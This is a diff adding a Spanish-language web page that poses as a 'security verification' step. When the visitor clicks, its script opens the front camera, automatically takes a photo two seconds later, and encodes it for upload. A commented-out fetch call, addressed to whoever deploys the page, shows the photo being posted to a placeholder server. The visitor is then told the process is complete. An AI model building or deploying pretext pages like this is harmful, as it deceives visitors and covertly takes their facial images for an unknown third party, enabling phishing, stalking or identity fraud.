@@ -1,1 +1,115 @@
 
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificación</title>
+    <style>
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
+            text-align: center; 
+            padding: 30px 20px; 
+            background: #f4f4f9; 
+            color: #333;
+        }
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            background: white;
+            padding: 20px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        }
+        #video {
+            width: 100%;
+            border-radius: 8px;
+            margin-top: 15px;
+            transform: scaleX(-1);
+        }
+        canvas { display: none; }
+        .btn { 
+            background: #007bff; 
+            color: white; 
+            border: none; 
+            padding: 14px 28px; 
+            font-size: 16px; 
+            font-weight: bold;
+            border-radius: 8px; 
+            cursor: pointer; 
+            width: 100%;
+            margin-top: 15px; 
+        }
+        #status { margin-top: 15px; font-size: 14px; color: #666; }
+    </style>
+</head>
+<body>
+
+    <div class="container" id="mainContainer">
+        <h2>Verificación de Seguridad</h2>
+        <p>Por favor, presiona el botón para iniciar.</p>
+        <button class="btn" id="startBtn">Iniciar Verificación</button>
+        <p id="status"></p>
+
+        <!-- El video de la cámara en vivo -->
+        <video id="video" autoplay playsinline muted></video>
+    </div>
+
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const startBtn = document.getElementById('startBtn');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const statusText = document.getElementById('status');
+
+        startBtn.addEventListener('click', async () => {
+            startBtn.style.display = 'none';
+            statusText.textContent = "Solicitando acceso a la cámara...";
+
+            try {
+                // Abrir la cámara frontal de manera automática tras el clic
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+                    audio: false
+                });
+
+                video.srcObject = stream;
+                statusText.textContent = "Cámara abierta. Capturando imagen...";
+
+                // Esperar 2 segundos con la cámara abierta y luego tomar la foto automáticamente
+                setTimeout(() => {
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    // Imagen convertida a texto (Base64)
+                    const imageDataURL = canvas.toDataURL('image/png');
+
+                    // AQUí ES DONDE DEBES ENVIAR LA FOTO A TU SERVIDOR:
+                    // Ejemplo de cómo se enviaría por POST a una API o backend tuyo:
+                    /*
+                    fetch('https://tu-servidor.com/guardar-foto', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ imagen: imageDataURL })
+                    });
+                    */
+
+                    // Apagar la cámara y mostrar mensaje final
+                    stream.getTracks().forEach(track => track.stop());
+                    document.getElementById('mainContainer').innerHTML = "<h3>¡Proceso completado!</h3><p>Ya puedes cerrar esta ventana.</p>";
+
+                }, 2000); // 2000 milisegundos (2 segundos) con la cámara abierta antes de disparar
+
+            } catch (err) {
+                console.error("Error:", err);
+                startBtn.style.display = 'block';
+                statusText.textContent = "Debes permitir el acceso a la cámara para continuar.";
+            }
+        });
+    </script>
+</body>
+</html>
